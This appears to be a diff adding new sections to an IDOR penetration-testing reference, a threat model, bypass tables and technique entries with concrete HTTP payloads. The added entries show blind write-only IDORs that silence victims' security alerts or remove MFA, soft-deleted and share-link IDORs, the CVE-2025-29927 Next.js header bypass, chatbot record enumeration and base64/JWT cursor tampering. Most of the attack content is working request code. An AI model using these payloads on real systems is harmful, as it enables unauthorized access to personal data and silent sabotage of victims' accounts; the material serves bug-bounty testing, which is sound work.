@@ -1128,7 +1128,7 @@ done
 
 ## Threat Model
 
-> Current patterns as of 2026-05-26. Update each session.
+> Current patterns as of 2026-05-28. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -1196,6 +1196,49 @@ done
     guards because the format check fails before ownership is ever verified. These are
     low-effort, high-yield bypasses on any platform using MongoDB or timestamp-based IDs.
 
+13. **Blind IDOR (write-only side-effect)** (NEW 2026-05) — As direct data-disclosure
+    IDORs get patched, write-only IDORs are increasingly the surviving attack surface.
+    Unsubscribing victims from security alerts, deleting their saved content, or revoking
+    their sessions via IDOR produces no discriminating server response — the attacker sees
+    only a 204 or `{"success": true}`. These are systematically missed by automated
+    scanners and diff-based IDOR tools because there's nothing to compare in the response.
+
+14. **Soft-delete ACL gap** (NEW 2026-05) — Developers who implement soft-delete (logical
+    flag) consistently forget to enforce object ownership checks on the deleted-state API
+    paths. Items in "trash" or "recently deleted" collections are assumed inaccessible,
+    so authorization middleware is never applied. Direct API calls bypass the UI and reach
+    the soft-deleted object with no ownership validation. Deleted content often contains
+    the most sensitive data users thought they had purged.
+
+15. **Share link generation IDOR** (NEW 2026-05) — Resource sharing endpoints that
+    generate public share URLs are almost universally checked for authentication only, not
+    ownership. Authenticated attacker creates a share link for any resource by supplying
+    its ID — then distributes the link to expose victim's private data to external parties.
+    Facebook Business Manager: $5,375 bounty (July 2025). Any `/api/*/share`, `/generate-
+    link`, or `/create-share-token` endpoint is a high-priority test target.
+
+16. **Next.js middleware bypass (CVE-2025-29927)** (NEW 2026-05) — The `x-middleware-
+    subrequest` header in Next.js is trusted without origin verification. Adding it to any
+    inbound request causes the framework to skip all middleware — bypassing authentication,
+    RBAC, rate limiting, and IP filtering in a single header. CVSS 9.1; affects all self-
+    hosted Next.js before 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3. Disclosed March 2025.
+    Vercel-hosted deployments are automatically patched; Docker/Node self-hosted are
+    exposed. Check for `x-powered-by: Next.js` to identify targets.
+
+17. **AI/chatbot backend API IDOR** (NEW 2026-05) — AI chatbot platforms (Paradox, Intercom,
+    Drift, Kore.ai) expose internal REST endpoints that process conversation records by
+    sequential numeric IDs with no object-level authorization. These endpoints are assumed
+    internal-only and never security-tested. Real-world: McHire/McDonald's (June 2025) —
+    64 million applicant records exposed by decrementing a single `lead_id`. Any chatbot-
+    powered application is now a priority target for IDOR.
+
+18. **Cursor/pagination token IDOR** (NEW 2026-05) — Cursor tokens in paginated APIs encode
+    user scope (userId, tenantId, last-seen object ID) into base64 or JWT structures. Servers
+    trust the cursor without re-validating session ownership. Decode, substitute victim userId,
+    re-encode → full access to victim's paginated data stream. Affects GraphQL Relay
+    (endCursor), Elasticsearch scroll, MongoDB resume_token, and any `page_token` / `after`
+    / `continuation_token` parameter.
+
 ---
 
 ## Bypass Matrix
@@ -1225,6 +1268,12 @@ done
 | Integer-format ACL guard | Submit ID in hex: `0x4642d` — ORM resolves to same row, ACL skips non-decimal input |
 | Numeric ID seems random | Check if it's a Unix timestamp — enumerate ±N seconds around a known anchor |
 | MongoDB ObjectID (hard to guess) | Extract timestamp from known ObjectID; sweep counter bytes of same timestamp/machine/process |
+| Write-only endpoint — no data in response | Confirm with two-account testing: observe side effect on victim account (item deleted, email suppressed) |
+| Object is "deleted" — assumed inaccessible | Call API directly with deleted object ID — soft-delete flag in DB doesn't remove ownership check unless explicitly coded |
+| Share link creation requires ownership | Submit another user's resource ID to the share link endpoint — auth check only, not ownership |
+| Next.js middleware enforces auth | Add `x-middleware-subrequest: middleware` header — skips all middleware (CVE-2025-29927, CVSS 9.1) |
+| Chatbot/AI platform "internal" API | Intercept chatbot XHR in Burp — sequential `lead_id` / `session_id` in internal endpoints → decrement to enumerate all records |
+| Opaque cursor / pagination token | Decode base64 cursor, modify `userId` / `tenantId` / `lastId`, re-encode — pagination scope not re-validated against session |
 
 ---
 
@@ -1256,6 +1305,12 @@ done
 | Any endpoint with numeric ID in hex range | Hex ID bypass | ACL skips non-decimal input; ORM fetches object normally |
 | Password reset / session endpoints with timestamp IDs | Timestamp enumeration | Deterministic IDs enable targeted window sweep → ATO |
 | MongoDB-backed `/api/users/{objectId}` | ObjectID prediction | Counter bytes enumerable → cross-user data access |
+| AI/chatbot backend (`/api/lead/`, `/api/sessions/`, `/api/conversations/`) | Sequential integer | Chat transcripts, applicant PII, session tokens — McHire: 64M records (2025) |
+| Share link endpoints (`/api/*/share`, `/generate-link`, `/create-share-token`) | Numeric / GUID | Private resource distributed to external parties without victim consent |
+| Recently deleted / trash (`/api/trash`, `/api/posts?status=deleted`) | Numeric / GUID | Sensitive deleted content assumed inaccessible; ACL stripped on soft-delete |
+| Next.js middleware-protected routes (any path on unpatched self-hosted Next.js) | Route-level bypass | CVE-2025-29927 — all auth/RBAC bypassed with one header; CVSS 9.1 |
+| Cursor/pagination endpoints (`?cursor=`, `?after=`, `?page_token=`) | Encoded token | Full cross-user data stream access via decoded and re-encoded cursor |
+| Write-only / side-effect endpoints (unsubscribe, delete, mark-read, revoke) | Numeric / GUID | Blind IDOR: silent sabotage with no visible attacker-side data leak |
 
 ---
 
@@ -1446,3 +1501,316 @@ object-level authorization. The same parameter used for IDOR can accept SQL inje
 Always test injection in ID parameters even when brute-force is infeasible.
 Source: https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a
 ```
+
+### Chain 9: CVE-2025-29927 + IDOR → Unauthenticated Admin Access on Next.js
+
+```
+1. Fingerprint Next.js: look for "x-powered-by: Next.js" in response headers,
+   "__nextjs" cookies, or /_next/static/ paths in page source
+
+2. Test CVE-2025-29927 middleware bypass:
+   GET /admin/dashboard HTTP/1.1
+   Host: target.com
+   x-middleware-subrequest: middleware
+   → If 200 OK instead of 302/401 → all middleware skipped, auth bypass confirmed
+
+3. Access admin API routes without any token:
+   GET /api/admin/users HTTP/1.1
+   x-middleware-subrequest: middleware
+   → Returns all user records (vertical escalation, no token required)
+
+4. Access any user's data directly:
+   GET /api/users/1002/profile HTTP/1.1
+   x-middleware-subrequest: middleware
+   → Full PII returned (horizontal IDOR, no authentication at all)
+
+5. Enumerate all users:
+   Burp Intruder: GET /api/users/§id§/profile with x-middleware-subrequest: middleware
+   → Complete user database exposed with zero credentials
+
+Impact: Critical — full authentication + authorization bypass on any unpatched
+self-hosted Next.js (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3)
+Note: Vercel-hosted apps are auto-patched; self-hosted Docker/Node deployments are primary targets
+CVE: CVE-2025-29927, CVSS 9.1
+```
+
+---
+
+## Blind IDOR (Write-Only / Side-Effect IDOR)
+**Reference type:** Numeric / GUID
+**API pattern:** REST
+**Authorization flaw:** The server performs a write operation on a foreign object without checking ownership but returns no discriminating data in the response — only a 204, a `{"success": true}`, or the attacker's own data. The impact is visible only as a side effect from the victim's perspective: their item disappears, their security alert is suppressed, their notification is marked read, or their MFA device is deleted. These actions are typically harder to detect in server logs than data-disclosure IDORs because the response reveals nothing to the attacker.
+**Escalation:** Horizontal
+**Business impact:** Silent sabotage — unsubscribe victims from security alerts, delete their saved data, corrupt preferences, revoke their sessions — all without triggering server-side data leakage alarms. Higher severity than read-only IDOR on platforms with poor write-action auditing.
+**Test payload:**
+```http
+# Unsubscribe another user from security email notifications:
+POST /api/notifications/unsubscribe HTTP/1.1
+Authorization: Bearer <your-token>
+Content-Type: application/json
+{"user_id": 1002, "type": "security_alerts"}
+→ 200 OK {"success": true}   ← victim silently stopped receiving security alerts
+
+# Delete another user's saved item (no visible data to attacker):
+DELETE /api/saved_items/9182 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 204 No Content   ← item removed from victim's saved list
+
+# Mark another user's notifications as read (suppress security notices):
+POST /api/notifications/mark_read HTTP/1.1
+Authorization: Bearer <your-token>
+{"notification_ids": [8801, 8802, 8803], "user_id": 1002}
+→ 200 OK   ← victim's unread count drops silently
+
+# Verify the blind IDOR worked via two-account testing:
+# Account A (attacker): send request with victim's ID
+# Account B (victim): log in and observe whether item/notification/preference changed
+# A status change in Account B confirms the blind IDOR
+
+# High-value blind IDOR targets:
+# - Email/SMS notification unsubscribe endpoints
+# - Session revocation: DELETE /api/sessions/sess_abc123
+# - MFA device removal: DELETE /api/users/1002/mfa
+# - Password reset invalidation: POST /api/password_reset/invalidate
+# - Account lockout triggering: POST /api/auth/failed_attempt {"user_id": 1002}
+```
+**Source:** https://medium.com/@sagarsajeev/unsubscribe-any-users-e-mail-notifications-via-idor-2c2e05b79dac
+
+---
+
+## IDOR in Soft-Deleted / Recently Deleted Objects
+**Reference type:** Numeric / GUID
+**API pattern:** REST / GraphQL
+**Authorization flaw:** When an object is soft-deleted (flagged `deleted=true` or `status='deleted'` but not removed from the database), developers remove the item from the UI without updating the ACL logic. API endpoints that serve deleted/archived objects check authentication but not ownership of the deleted resource — the assumption being that "deleted" items are inaccessible anyway. The gap: ACL is enforced on the live object, not the deleted copy.
+**Escalation:** Horizontal
+**Business impact:** Access to another user's deleted content — which often contains the most sensitive data: deleted messages, removed financial records, revoked tokens, withdrawn job applications, purged credentials. Deleted ≠ inaccessible without explicit ACL on the deleted state.
+**Test payload:**
+```http
+# Step 1: Create and delete your own object, observe the deletion is soft
+DELETE /api/posts/9001 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 200 OK {"deleted": true, "id": 9001}   ← soft delete, stays in DB
+
+# Step 2: Confirm the deleted object is still API-accessible:
+GET /api/posts/9001 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 200 OK {"id": 9001, "status": "deleted", "content": "..."}
+# Item accessible via API even though removed from UI
+
+# Step 3: Access another user's deleted object:
+GET /api/posts/9000 HTTP/1.1   ← another user's deleted post
+Authorization: Bearer <your-token>
+→ If 200 OK → IDOR on soft-deleted object confirmed
+
+# Step 4: Test the trash / recently-deleted collection endpoint:
+GET /api/trash HTTP/1.1
+Authorization: Bearer <your-token>
+→ Should return only your own deleted items
+
+GET /api/trash?user_id=1002     ← inject another user's ID
+GET /api/recently_deleted/9000  ← direct access by ID
+GET /api/posts?status=deleted&user_id=1002
+
+# Step 5: Also test restore and permanent-delete endpoints on other users' deleted items:
+POST /api/posts/9000/restore HTTP/1.1   ← restore victim's deleted post (now visible in their feed)
+DELETE /api/posts/9000/permanent HTTP/1.1  ← permanently delete victim's data
+
+# Soft-delete indicators in API responses to look for:
+# "deleted_at": "2025-05-28T10:00:00Z"
+# "status": "archived" / "deleted" / "trashed"
+# "is_deleted": true / "soft_deleted": 1
+```
+**Source:** https://medium.com/@0x1di0t/undeleted-secrets-uncovering-an-idor-vulnerability-in-recently-deleted-items-6d35db221008
+
+---
+
+## IDOR in Share Link / Resource Sharing Endpoint
+**Reference type:** Numeric / GUID
+**API pattern:** REST
+**Authorization flaw:** The endpoint that generates a shareable link for a resource checks only that the requester is authenticated, not that they own the resource. Any authenticated user can produce a valid public share link for any object by supplying its ID — then distribute that link to external parties who can access the victim's private content without the victim or platform knowing the attacker was the link creator.
+**Escalation:** Horizontal
+**Business impact:** Attacker generates and distributes share links for another user's private resources (campaign plans, business reports, documents, dashboards). Private strategy or financial data reaches external parties. In the Facebook Business Manager case (July 2025): $5,375 bounty for share link creation on any campaign planner without ownership.
+**Test payload:**
+```http
+# Normal flow: Create share link for YOUR resource:
+POST /api/campaign_plans/share HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer <your-token>
+{"plan_id": "CP-1001"}
+→ {"share_url": "https://target.com/shared/abc123", "expires_in": 7776000}
+
+# IDOR: Substitute another user's resource ID:
+POST /api/campaign_plans/share HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer <your-token>
+{"plan_id": "CP-1002"}   ← another user's resource ID
+→ {"share_url": "https://target.com/shared/xyz999"}
+# IDOR confirmed: attacker holds a valid share link to victim's private resource
+
+# Verify the link exposes victim's data without authentication:
+GET https://target.com/shared/xyz999
+(no Authorization header)
+→ Returns victim's private campaign content → Critical IDOR
+
+# Generalize to other share/export/invite-link endpoints:
+POST /api/reports/{report_id}/share
+POST /api/documents/{doc_id}/generate-link
+POST /api/projects/{project_id}/public-link
+GET  /api/share?resource_id=DOC-9982&type=document
+POST /api/dashboards/1002/share-token
+POST /api/folders/9982/create-share-link
+
+# Write IDOR variant — attacker creates then revokes victim's share links:
+DELETE /api/shared-links/xyz999   ← revokes another user's existing share link
+```
+**Source:** https://medium.com/@muriarfad/5375-bounty-idor-creating-a-share-link-for-any-campaign-planner-in-facebook-business-03f0994d4d16
+
+---
+
+## Next.js Middleware Authorization Bypass (CVE-2025-29927)
+**Reference type:** Route-level (any protected path)
+**API pattern:** REST (Next.js framework, any self-hosted deployment)
+**Authorization flaw:** Next.js uses an internal header `x-middleware-subrequest` to mark server-initiated sub-requests so middleware is not re-executed (preventing infinite loops). This header is trusted without verifying its origin. Any externally-supplied request that includes this header causes the Next.js runtime to skip all middleware — bypassing every authentication gate, RBAC check, rate limiter, and IP allow-list implemented in middleware.js.
+**Escalation:** Vertical (admin route bypass) + Horizontal (any user's data, no token needed)
+**Business impact:** Complete bypass of all Next.js middleware-based access controls. Every `/api/` route, admin panel, and protected page becomes unauthenticated. Affects all self-hosted Next.js before 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3. CVSS 9.1. Disclosed March 2025. Vercel-hosted deployments are automatically patched.
+**Test payload:**
+```http
+# Without bypass — protected route returns redirect/401:
+GET /admin/dashboard HTTP/1.1
+Host: target.com
+→ 302 Redirect to /login
+
+# CVE-2025-29927 bypass — skip all middleware:
+GET /admin/dashboard HTTP/1.1
+Host: target.com
+x-middleware-subrequest: middleware
+→ 200 OK (admin panel served with no auth check)
+
+# Try alternate header values (map to middleware file path):
+x-middleware-subrequest: src/middleware
+x-middleware-subrequest: pages/_middleware
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+
+# Target admin and internal API routes:
+GET /api/admin/users HTTP/1.1
+x-middleware-subrequest: middleware
+→ 200 OK — all user records, no auth
+
+GET /api/internal/config HTTP/1.1
+x-middleware-subrequest: middleware
+→ Secrets, feature flags, internal config
+
+# IDOR via bypass: access any user's data without a token:
+GET /api/users/1002/profile HTTP/1.1
+x-middleware-subrequest: middleware
+→ Full PII, no Authorization header needed
+
+# Fingerprint Next.js before testing:
+# - Response header: x-powered-by: Next.js
+# - URL paths: /_next/static/, /_next/image
+# - Cookie names starting with __nextjs or __Host-next-auth
+
+# Affected versions: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3 (self-hosted only)
+# Mitigation: upgrade; or configure reverse proxy to strip x-middleware-subrequest from inbound requests
+```
+**Source:** CVE-2025-29927 — https://nvd.nist.gov/vuln/detail/CVE-2025-29927; https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/
+
+---
+
+## IDOR in AI/Chatbot Backend APIs
+**Reference type:** Sequential integer (`lead_id`, `session_id`, `conversation_id`)
+**API pattern:** REST (internal API endpoints of AI chatbot platforms)
+**Authorization flaw:** AI-powered chatbot platforms (hiring bots, support agents, customer service bots) expose internal REST endpoints that retrieve conversation records by sequential numeric identifiers. These endpoints authenticate via session token or API key but perform no object-level authorization — any session can fetch any conversation by ID. The endpoints are obscured (paths like `/api/lead/cem-xhr`, `/internal/`, `/api/chat/sessions/`) and assumed internal-only, so they are rarely added to bug bounty scope or tested by security teams.
+**Escalation:** Horizontal
+**Business impact:** Mass exfiltration of AI conversation transcripts, applicant PII, and session tokens. Real-world case: McHire chatbot (Paradox.ai, used by McDonald's) — June 2025, 64 million job applicant records exposed by decrementing a single `lead_id` integer. Full names, contact details, chat transcripts, and session tokens retrieved per request with no ownership check.
+**Test payload:**
+```http
+# Step 1: Intercept traffic from any AI chatbot interaction
+# Use Burp Suite proxy — look for API calls with sequential numeric IDs in the chatbot flow
+
+# Common endpoint patterns in AI chatbot platforms:
+GET /api/lead/cem-xhr?lead_id=88291 HTTP/1.1
+Cookie: <session from chatbot interaction>
+→ Returns full PII and transcript for lead 88291
+
+# Step 2: Decrement/increment the ID — no ownership check:
+GET /api/lead/cem-xhr?lead_id=88290 HTTP/1.1
+Cookie: <same session>
+→ Full chat transcript, name, email, phone, session token of a different applicant
+
+# Step 3: Automate enumeration with Burp Intruder:
+# Payload type: Numbers
+# From: your_lead_id - 1000; To: your_lead_id + 1000; Step: 1
+# Grep for: "email", "phone", "name", "session_token", "transcript"
+
+# Common chatbot platform endpoint patterns to look for in Burp history:
+GET /api/sessions/{session_id}/messages
+GET /api/conversations/{id}/history
+POST /api/chat/sessions/{id}/details
+GET /api/applicants/{lead_id}/data
+GET /v1/leads/{id}
+GET /api/candidates/{id}/conversation
+
+# Detection signals for vulnerable chatbot APIs:
+# - Sequential numeric IDs visible in any chatbot-related XHR request
+# - Powered-by headers: Paradox, Intercom, Drift, Ada, Kore.ai, Liveperson
+# - Subdomains: hire.company.com, chat.company.com, support.company.com
+# - Session tokens exposed in conversation API responses (escalate to ATO)
+# - /api/ or /internal/ routes called by the chatbot frontend JS bundle
+```
+**Source:** https://www.bitdefender.com/en-gb/blog/hotforsecurity/mchire-mcdonalds-chatbot-64-million; https://research.cgu.edu/icdc/2025/07/01/mcdonalds-july-2025-breach/
+
+---
+
+## IDOR via Cursor / Pagination Token Manipulation
+**Reference type:** Encoded token (base64, JWT, opaque string)
+**API pattern:** REST (cursor-based pagination)
+**Authorization flaw:** Cursor-paginated APIs encode pagination context (last-seen object ID, user scope, timestamp anchor) into an opaque token passed as `cursor`, `page_token`, `after`, or `next_page_token`. The server trusts the cursor's encoded scope without re-validating ownership against the active session. Decoding the cursor, substituting a different user's anchor ID or user scope, and re-encoding returns that user's paginated data as if the server generated the cursor itself.
+**Escalation:** Horizontal
+**Business impact:** Access to another user's complete paginated data streams — message history, transaction lists, notification feeds, audit logs, search results — by injecting their user ID into the cursor token.
+**Test payload:**
+```http
+# Step 1: Retrieve your own paginated response and extract the cursor:
+GET /api/messages?limit=20 HTTP/1.1
+Authorization: Bearer <your-token>
+→ {
+    "messages": [...],
+    "cursor": "eyJ1c2VySWQiOiAxMDAxLCAibGFzdElkIjogNTAwfQ=="
+  }
+
+# Step 2: Decode the cursor (base64):
+echo "eyJ1c2VySWQiOiAxMDAxLCAibGFzdElkIjogNTAwfQ==" | base64 -d
+→ {"userId": 1001, "lastId": 500}
+
+# Step 3: Modify the userId, re-encode:
+echo -n '{"userId": 1002, "lastId": 1}' | base64
+→ eyJ1c2VySWQiOiAxMDAyLCAibGFzdElkIjogMX0=
+
+# Step 4: Submit the modified cursor — receives victim's paginated data:
+GET /api/messages?limit=20&cursor=eyJ1c2VySWQiOiAxMDAyLCAibGFzdElkIjogMX0= HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns user 1002's messages from page 1 (full history accessible by iterating cursor)
+
+# JWT-encoded cursors — decode middle section, modify scope, re-sign or use alg:none:
+python3 jwt_tool.py <cursor_token> -T   # tamper mode
+python3 jwt_tool.py <cursor_token> -X a  # alg:none attack
+
+# Common pagination parameter names to test:
+# cursor, after, before, page_token, next_page_token, continuation_token,
+# offset_token, scroll_id (Elasticsearch), resume_token (MongoDB changestream),
+# pageInfo.endCursor (GraphQL Relay pagination)
+
+# GraphQL Relay pagination IDOR:
+query {
+  messages(first: 20, after: "<base64-modify-userId>") {
+    edges { node { content } }
+    pageInfo { endCursor hasNextPage }
+  }
+}
+
+# Elasticsearch scroll IDOR — reuse another session's scroll context:
+GET /api/search/scroll HTTP/1.1
+{"scroll": "1m", "scroll_id": "<scroll_id_from_another_user_session>"}
+→ Continues victim's search session, returns their scoped results
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
